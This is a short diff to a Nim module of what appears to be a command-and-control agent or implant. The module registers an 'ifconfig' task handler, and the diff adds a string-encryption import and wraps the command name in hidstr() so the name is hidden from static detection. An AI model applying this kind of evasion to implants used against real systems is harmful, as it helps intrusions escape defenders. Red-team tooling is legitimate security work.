@@ -1,6 +1,7 @@
 import std/[json, osproc]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc ifconfigExecute(taskId: string, params: JsonNode, state: AgentState,
                      send: SendMsg): TaskResult =
@@ -21,4 +22,4 @@ proc ifconfigExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initIfconfig*() =
-  register("ifconfig", ifconfigExecute)
+  register(hidstr("ifconfig"), ifconfigExecute)
